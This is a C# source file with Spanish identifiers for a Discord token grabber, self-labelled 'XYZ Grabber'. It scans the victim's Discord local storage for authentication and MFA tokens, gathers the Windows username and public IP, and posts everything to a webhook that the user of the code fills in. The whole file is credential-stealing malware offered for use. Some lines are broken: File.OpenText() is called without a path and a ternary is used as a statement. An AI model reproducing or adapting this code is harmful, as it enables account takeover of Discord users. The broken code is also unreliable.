using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Net;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Text;
using System.Security.Principal;

namespace le01q
{
    class XYZ
    {
        private static string webHook = "";  // Aqui va tu webhook
        private static bool algoEncontrado = false;

        static void Main()
        {
            var mensaje = Obtener();

            if (algoEncontrado)
            {
                enviarmeResultados(mensaje);
            }
        }

        public static List<string> Obtener()
        {
            List<string> DISCORD_TOKENS = new List<string>();
            DirectoryInfo dirPrincipal = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
            
            foreach (var archivo in dirPrincipal.GetFiles(false ? "*.log" : "*.ldb"))
            {
                string archivoLeido = File.OpenText().ReadToEnd();

                foreach (Match match in Regex.Matches(archivoLeido, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))

                    DISCORD_TOKENS.Add(match.Value + "\n");
                
                foreach (Match match in Regex.Matches(archivoLeido, @"mfa\.[\w-]{84}"))

                    DISCORD_TOKENS.Add(match.Value + "\n");
            }

            DISCORD_TOKENS = DISCORD_TOKENS.ToList();

            Console.WriteLine(DISCORD_TOKENS);

            DISCORD_TOKENS.Count > 0 ? algoEncontrado = true : DISCORD_TOKENS.Add("> Vacio..."); return DISCORD_TOKENS;

        }

        public static string ObtenerIP()
        {
            string IP = new WebClient().DownloadString("https://whatismyipaddress.com/");
            return IP;
        }

        static void enviarmeResultados(List<string> mensaje)
        {
            HTTP.Posteo(webHook, new NameValueCollection()
            {
                { "usuario", "XYZ Grabber por le01q" },
                { "avatar_url", "https://cdn.discordapp.com/attachments/861138353750802457/911477768024367115/maxresdefault.jpg" },
                { "contenido", "```\n" + "Recolector de informacion XYZ\n\n" + "Usuario: " + Environment.UserName + "\nIP: " + ObtenerIP() + "\nTokens:\n\n" + String.Join("\n", mensaje) + "\n\nEl último valor es el correcto" + "\n```" }
            });
        }
    }

    class HTTP
    {
        public static byte[] Posteo(string URI, NameValueCollection pares)
        {
            using (WebClient webClient = new WebClient())
                return webClient.UploadValues(URI, pares);
        }
    }
}